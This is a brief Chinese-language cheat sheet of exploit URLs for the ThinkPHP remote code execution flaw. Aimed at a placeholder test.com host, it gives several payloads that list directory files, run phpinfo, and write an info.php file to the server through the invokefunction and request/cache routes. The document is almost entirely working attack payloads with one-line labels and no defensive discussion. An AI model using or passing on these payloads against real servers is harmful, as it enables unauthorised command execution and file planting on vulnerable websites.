

1、执行漏洞显示目录下文件，可构造如下 payload

http://www.test.com/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20-l


http://www.test.com/public/index.php?s=/index/\think\request/cache&key=ls%20-l|system

2、执行phpinfo,可构造如下payload

http://www.test.com/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'


http://www.test.com/public/index.php?s=/index/\think\request/cache&key=1|phpinfo

3、写info.php文件，如下payload


http://www.test.com/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%27<?php%20phpinfo();?>%27%20>%20info.php

http://www.test.com/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=info.php&vars[1][]=%3C?php%20phpinfo();?%3E

